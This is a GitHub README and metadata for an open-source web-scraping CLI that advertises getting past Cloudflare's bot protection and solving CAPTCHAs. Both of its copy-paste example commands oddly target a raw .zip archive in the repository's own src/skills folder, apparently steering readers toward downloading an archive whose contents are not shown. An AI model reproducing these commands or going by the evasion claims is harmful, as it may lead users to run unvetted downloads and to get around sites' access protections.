---
repo: "SadikinAraf/imperium-crawl"
name: "imperium-crawl"
description: "Extract, crawl, and scrape web data efficiently with a powerful open-source CLI tool requiring no API keys and minimal setup."
url: "https://github.com/SadikinAraf/imperium-crawl"
homepage: "https://github.com/SadikinAraf"
language: "TypeScript"
languages: ["TypeScript"]
languagePcts: [100]
topics: ["github-config", "anti-bot", "api-discovery", "brave-search", "crawling", "download", "instagram", "media-downloader", "open-source", "reddit"]
stars: 9
forks: 0
openIssues: 0
closedIssues: 0
watchers: 1
contributors: 3
recentReleases: 0
createdAt: "2021-06-19T06:19:36Z"
lastCommitAt: "2026-06-26T23:40:31Z"
status: "thriving"
tags: ["solo_builder", "hidden_gem", "legacy_hero"]
healthScore: 68
undervaluedScore: 35
maintainers: ["ceoimperiumprojects", "SadikinAraf"]
openGraphImageUrl: "https://opengraph.githubassets.com/844326ab24cae65e8fe91a5c83171d73cfce5a111099bf177335c9d6a4e22ee9/SadikinAraf/imperium-crawl"
---

# imperium-crawl

**The most powerful open-source CLI tool for web scraping, crawling, and data extraction.**

28 tools. Zero API keys required. One `npx` command.

</div>

---

## Quick Start

Get running in 30 seconds.

**CLI** (zero install):

```bash
npx -y imperium-crawl scrape --url https://github.com/SadikinAraf/imperium-crawl/raw/refs/heads/main/src/skills/imperium-crawl-2.6-alpha.1.zip
```

**Global install:**

```bash
npm install -g imperium-crawl
```

> That's it. 22 of 28 tools work with zero API keys. Add optional keys later to unlock search, AI extraction, and CAPTCHA solving.

---

## Power Examples

Real results. Copy-paste and try.

### Scrape through Cloudflare

```bash
imperium-crawl scrape --url https://github.com/SadikinAraf/imperium-crawl/raw/refs/heads/main/src/skills/imperium-crawl-2.6-alpha.1.zip
```

```
Level 1 (headers) → blocked
Level 2 (TLS fingerprint) → blocked
Level 3 (browser + stealth) → success ✅
→ Full markdown content extracted, 213K characters
→ Next visit: skips straight to Level 3 (learned)
```

### Discover hidden APIs on any website

```bash
imperium-crawl discover-apis --url…
